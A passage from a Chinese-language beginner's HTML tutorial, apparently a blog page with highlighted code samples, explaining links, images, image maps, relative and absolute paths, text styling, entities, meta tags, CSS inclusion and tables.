class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#one&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-comment">&lt;!--必须要让页面能够有滚动效果后才能实现，即让页面能够有下滑的空间--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;one&quot;</span>&gt;</span>This is a test.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>上面的代码用 href 创建了一个超链接 #one 的值。<br>当用户单击链接时，浏览器将在文档中查找元素其 id 属性的值为 one ，并跳转到此位置。如果元素不可见屏幕，浏览器将滚动文档以显示它。<br>如果浏览器不能找到具有所需 id 属性值的元素，它会再次搜索，寻找一个与目标匹配的 name 属性。</p><h3 id="6-3相关属性"><a href="#6-3相关属性" class="headerlink" title="6.3相关属性"></a>6.3相关属性</h3><h4 id="6-3-1-链接打开方式（target）"><a href="#6-3-1-链接打开方式（target）" class="headerlink" title="6.3.1 链接打开方式（target）"></a>6.3.1 链接打开方式（target）</h4><p>默认情况下，浏览器使用显示当前文档的窗口，选项卡或框架显示链接的文档并替换现有文档。即在当前的窗口打开。</p><blockquote><ul><li>_blank - 在新窗口（或选项卡）中打开文档。</li><li>_parent - 打开父框架集中的文档。</li><li>_self - 在当前窗口中打开文档（这是默认行为）。</li><li>_top - 在窗口的整个主体中打开文档。</li><li>&lt;frame&gt; - 在指定的框架中打开文档。</li></ul></blockquote><h2 id="7-图像（-lt-img-gt-）￥"><a href="#7-图像（-lt-img-gt-）￥" class="headerlink" title="7.图像（&lt;img&gt;）￥"></a>7.图像（&lt;img&gt;）￥</h2><p>HTML 图像是通过标签&lt;img&gt;来定义的。使用img元素来为你的网站添加图片，使用src 属性指向一个图片的具体地址。<br>请注意：img元素是自关闭元素，不需要结束标记。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;logonew2.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="7-1相关属性"><a href="#7-1相关属性" class="headerlink" title="7.1相关属性"></a>7.1相关属性</h3><h4 id="7-1-1提示信息（alt）"><a href="#7-1-1提示信息（alt）" class="headerlink" title="7.1.1提示信息（alt）"></a>7.1.1提示信息（alt）</h4><p>alt 属性用来为图像定义一串预备的可替换的文本。在浏览器无法载入图像时，替换文本属性告诉读者他们失去的信息。此时，浏览器将显示这个替代性的文本而不是图像。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;boat.gif&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Big Boat&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-2宽度高度（height、width）"><a href="#7-1-2宽度高度（height、width）" class="headerlink" title="7.1.2宽度高度（height、width）"></a>7.1.2宽度高度（height、width）</h4><p>height（高度）与width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;304&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;228&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--如果图像指定了高度宽度，页面加载时就会保留指定的尺寸。如果没有指定图片的大小，加载页面时有可能会破坏HTML页面的整体布局。--&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-3图像边框（border）"><a href="#7-1-3图像边框（border）" class="headerlink" title="7.1.3图像边框（border）"></a>7.1.3图像边框（border）</h4><p>使用border属性以像素为单位指定边框粗细。厚度为 0 表示图片周围没有边框。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;3&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-4图像对齐（align）"><a href="#7-1-4图像对齐（align）" class="headerlink" title="7.1.4图像对齐（align）"></a>7.1.4图像对齐（align）</h4><p>默认情况下，图像在页面中将显示为左侧对齐，可以使用align属性将设置图像的对齐方式：left(左侧)或center(居中)或right(右侧)。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>1.假如某个 HTML 文件包含十个图像，那么为了正确显示这个页面，需要加载 11 个文件。</strong><br><strong>2.加载图片是需要时间的。</strong></p><h3 id="7-2图像映射"><a href="#7-2图像映射" class="headerlink" title="7.2图像映射"></a>7.2图像映射</h3><p>创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。不同点击有不同的效果。<br>map标签用来定义图像地图。area用来定义图像地图中的可点击区域，即可以在图像上划分区域，这些区域是可以点击的，并且对应不同的操作。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;planets.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;145&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;126&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Planets&quot;</span> <span class="hljs-attr">usemap</span>=<span class="hljs-string">&quot;#planetmap&quot;</span>&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;planetmap&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;rect&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;0,0,82,126&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Sun&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sun.gif&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;circle&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;90,58,3&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Mercury&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;merglobe.gif&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;circle&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;124,58,8&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Venus&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;venglobe.gif&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br><span class="hljs-comment">&lt;!--三个不同的区域，点击实现不同的效果--&gt;</span><br>其中：<br>coords 属性规定区域的 x 和 y 坐标。与 shape 属性配合使用，来规定区域的尺寸、形状和位置。图像左上角的坐标是(0,0)。<br></code></pre></div></td></tr></table></figure><h2 id="8-链接地址的几种方式"><a href="#8-链接地址的几种方式" class="headerlink" title="8.链接地址的几种方式"></a>8.链接地址的几种方式</h2><p>首先，所建HTML文档T在 C://User/HTML 目录下，并且该目录下还有一张图片A和另一个HTML文档B。</p><h3 id="8-1相对地址"><a href="#8-1相对地址" class="headerlink" title="8.1相对地址"></a>8.1相对地址</h3><p>如果文档T需要用到A或B，可以直接在链接处写A或B的名称（包括后缀名）。如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;A.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="8-2绝对地址"><a href="#8-2绝对地址" class="headerlink" title="8.2绝对地址"></a>8.2绝对地址</h3><p>若需要链接其他的，需要写全链接地址，如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;C://User/HTML/A.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>如果所需文档或链接等不在本目录下，而在上一目录文件下，则可以用 ../ 来实现访问上一目录，再进入所需要的文件即可。如：在C://User/ 目录下还有一个test文件夹，里面还有一张图片C，则访问它需要 &lt;img src=”../test/C.png” width=”206” height=”36”&gt;  ，这是相对访问，如果用绝对访问，直接写链接即可，即 C://User/test/C.png</strong></p><h3 id="8-3外部链接"><a href="#8-3外部链接" class="headerlink" title="8.3外部链接"></a>8.3外部链接</h3><p>即，可以正常访问的网页等。如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="9-换行（-lt-br-gt-）￥"><a href="#9-换行（-lt-br-gt-）￥" class="headerlink" title="9.换行（&lt;br&gt;）￥"></a>9.换行（&lt;br&gt;）￥</h2><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-水平分割线（-lt-hr-gt-）￥"><a href="#10-水平分割线（-lt-hr-gt-）￥" class="headerlink" title="10.水平分割线（&lt;hr&gt;）￥"></a>10.水平分割线（&lt;hr&gt;）￥</h2><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="11-文字样式"><a href="#11-文字样式" class="headerlink" title="11.文字样式"></a>11.文字样式</h2><h3 id="11-1-lt-strong-gt-与-lt-b-gt"><a href="#11-1-lt-strong-gt-与-lt-b-gt" class="headerlink" title="11.1 &lt;strong&gt; 与 &lt;b&gt;"></a>11.1 &lt;strong&gt; 与 &lt;b&gt;</h3><h3 id="11-2-lt-em-gt-与-lt-i-gt"><a href="#11-2-lt-em-gt-与-lt-i-gt" class="headerlink" title="11.2 &lt;em&gt; 与 &lt;i&gt;"></a>11.2 &lt;em&gt; 与 &lt;i&gt;</h3><blockquote><p>通常标签 &lt;strong&gt; 替换加粗标签 &lt;b&gt; 来使用， &lt;em&gt; 替换 &lt;i&gt;标签使用。<br>然而，这些标签的含义是不同的：<br>&lt;b&gt; 与&lt;i&gt; 定义粗体或斜体文本。<br>&lt;strong&gt; 或者 &lt;em&gt; 意味着你要呈现的文本是重要的，所以要突出显示。</p></blockquote><h3 id="11-3-上标与下标"><a href="#11-3-上标与下标" class="headerlink" title="11.3 上标与下标"></a>11.3 上标与下标</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">这是 <span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span> 下标<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span> 和 <span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span> 上标<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="12-实体"><a href="#12-实体" class="headerlink" title="12.实体"></a>12.实体</h2><p>实体是浏览器替换特殊字符的代码。有一些字符在HTML文档中有特殊的含义，例如&lt; 和&gt; 字符。要在内容中使用这些字符而不被解释为HTML，您可以使用HTML实体。</p><p>部分常用实体：<br>| 显示结果 | 描述              | 实体名称 | 实体编号 |<br>| ——– | —————– | ——– | ——– |<br>|          | 空格              | &amp;nbsp;   | &#160;   |<br>| &lt;        | 小于号            | &amp;lt;     | &#60;    |<br>| &gt;        | 大于号            | &amp;gt;     | &#62;    |<br>| &amp;        | 和号              | &amp;amp;    | &#38;    |<br>| ¢        | 分（cent）        | &amp;cent;   | &#162;   |<br>| £        | 镑（pound）       | &amp;pound;  | &#163;   |<br>| ¥        | 元（yen）         | &amp;yen;    | &#165;   |<br>| €        | 欧元（euro）      | &amp;euro;   | &#8364;  |<br>| ©        | 版权（copyright） | &amp;copy;   | &#169;   |<br>| ®        | 注册商标          | &amp;reg;    | &#174;   |</p><h2 id="13-属性"><a href="#13-属性" class="headerlink" title="13.属性"></a>13.属性</h2><p>属性是为 HTML 元素提供的附加信息。</p><ul><li>HTML 元素可以设置属性。</li><li>属性可以在元素中添加附加信息。</li><li>属性一般描述于开始标签。</li><li>属性总是以名称/值对的形式出现，比如：name=”value”。</li></ul><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&gt;</span>这是一个链接使用了 href 属性<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="13-1适用于大多数HTML元素的属性"><a href="#13-1适用于大多数HTML元素的属性" class="headerlink" title="13.1适用于大多数HTML元素的属性"></a>13.1适用于大多数HTML元素的属性</h3><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">class</td><td align="center">为html元素定义一个或多个类名（classname）(类名从样式文件引入)</td></tr><tr><td align="center">id</td><td align="center">定义元素的唯一id</td></tr><tr><td align="center">style</td><td align="center">规定元素的行内样式（inline style）</td></tr><tr><td align="center">title</td><td align="center">描述了元素的额外信息 (作为工具条使用)</td></tr></tbody></table><h2 id="14-搜索引擎关键词（-lt-meta-gt-）"><a href="#14-搜索引擎关键词（-lt-meta-gt-）" class="headerlink" title="14.搜索引擎关键词（&lt;meta&gt;）"></a>14.搜索引擎关键词（&lt;meta&gt;）</h2><p>一些搜索引擎会利用 meta 元素的 name 和 content 属性来索引您的页面。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//meta 元素定义页面的描述：<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Free Web tutorials on HTML, CSS, XML&quot;</span> /&gt;</span><br>//meta 元素定义页面的关键词：<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;HTML, CSS, XML&quot;</span> /&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="15-样式（-lt-style-gt-）"><a href="#15-样式（-lt-style-gt-）" class="headerlink" title="15.样式（&lt;style&gt;）"></a>15.样式（&lt;style&gt;）</h2><p>&lt;style&gt; 标签定义了HTML文档的样式文件引用地址。在&lt;style&gt; 元素中你需要指定样式文件来渲染HTML文档：</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span>        <br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow&#125;        </span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue&#125;        </span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>        <br></code></pre></div></td></tr></table></figure><h2 id="16-加载脚本（-lt-script-gt-）"><a href="#16-加载脚本（-lt-script-gt-）" class="headerlink" title="16.加载脚本（&lt;script&gt;）"></a>16.加载脚本（&lt;script&gt;）</h2><p>&lt;script&gt; 标签用于加载脚本文件，如： JavaScript。</p><h2 id="17-使用CSS"><a href="#17-使用CSS" class="headerlink" title="17.使用CSS"></a>17.使用CSS</h2><p>CSS 可以通过以下方式添加到 HTML 中：</p><blockquote><ul><li>内联样式- 在 HTML 元素中使用 “style” 属性</li><li>内部样式表 -在 HTML 文档头部 &lt;head&gt;&gt; 区域使用 &lt;style&gt; 元素 来包含 CSS</li><li>外部引用 - 使用外部 CSS 文件</li></ul></blockquote><p>最好的方式是通过外部引用 CSS 文件。</p><h3 id="17-1-内联样式"><a href="#17-1-内联样式" class="headerlink" title="17.1 内联样式"></a>17.1 内联样式</h3><p>当特殊的样式需要应用到个别元素时，就可以使用内联样式，你可以在 &lt;head&gt; 部分通过 &lt;style&gt; 标签定义内部样式表。 使用内联样式的方法是在相关的标签中使用样式属性。样式属性可以包含任何 CSS 属性。</p><p>实例一：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--改变段落的颜色--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><p>实例二：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--背景颜色--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:yellow;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:red;&quot;</span>&gt;</span>This is a heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:green;&quot;</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>实例三：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--字体颜色 ，字体大小--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:verdana;&quot;</span>&gt;</span>A heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;&quot;</span>&gt;</span>A paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>现在通常使用 font-family（字体），color（颜色），和 font-size（字体大小）属性来定义文本样式，而不是使用 &lt;font&gt; 标签。</p><h3 id="17-2-内部样式表"><a href="#17-2-内部样式表" class="headerlink" title="17.2 内部样式表"></a>17.2 内部样式表</h3><p>当单个文件需要特别样式时，就可以使用内部样式表。可以在 &lt;head&gt; 部分通过 &lt;style&gt; 标签定义内部样式表：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h3 id="17-3外部引用"><a href="#17-3外部引用" class="headerlink" title="17.3外部引用"></a>17.3外部引用</h3><p>当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。使用外部样式表，你就可以通过更改一个文件来改变整个站点（或全部页面）的外观。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mystyle.css&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--href地址为外部样式链接的地址--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h2 id="18-表格（-lt-table-gt-）"><a href="#18-表格（-lt-table-gt-）" class="headerlink" title="18.表格（&lt;table&gt;）"></a>18.表格（&lt;table&gt;）</h2><p>表格由&lt;table&gt;标签来定义。每个表格均有若干行（由&lt;tr&gt;标签定义），每行被分割为若干单元格（由&lt;td&gt;标签定义）。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。<br><strong>表格的基本结构：</strong></p><blockquote><ul><li>&lt;table&gt;…&lt;/table&gt;：定义表格</li><li>&lt;th&gt;…&lt;/th&gt;：定义表格的标题栏（文字会自动加粗）</li><li>&lt;tr&gt;…&lt;/tr&gt;：定义表格的行</li><li>&lt;td&gt;…&lt;/td&gt;：定义表格的列</li></ul></blockquote><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>效果如下：<br>| row 1, cell 1 | row 1, cell 2 |<br>| :-:| :-:|<br>| row 2, cell 1 | row 2, cell 2 |</p><h3 id="18-1相关属性"><a href="#18-1相关属性" class="headerlink" title="18.1相关属性"></a>18.1相关属性</h3><h4 id="18-1-1边框（border）"><a href="#18-1-1边框（border）" class="headerlink" 